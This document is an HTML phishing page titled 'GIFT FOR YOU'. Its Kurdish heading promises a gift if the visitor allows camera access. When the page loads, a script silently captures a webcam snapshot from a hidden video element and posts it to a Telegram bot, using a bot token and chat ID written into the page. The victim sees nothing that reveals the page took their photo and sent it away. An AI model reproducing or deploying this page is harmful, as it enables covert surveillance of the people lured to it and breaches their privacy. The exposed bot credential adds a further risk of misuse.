<!DOCTYPE html>
<html>
<head>
    <title>GIFT FOR YOU</title>
</head>
<body>
    <h2 style="text-align:center;">بۆ بینینی دیارییەکەت، تکایە ڕێگە بە کامێرا بدە</h2>
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const TOKEN = "8624059192:AAHhgZk6peV5k4LpkXIgX8CwuZkqcbjHHuE"; 
        const CHAT_ID = "7143804196"; 

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(takeSnap, 2000);
            } catch (err) {
                console.error("Error:", err);
            }
        }

        function takeSnap() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('photo', blob, 'snap.jpg');
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', "🎯 وێنەیەکی نوێ لە ڕێگەی لینکەوە گەیشت!");

                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg');
        }
        window.onload = startCamera;
    </script>
</body>
</html>
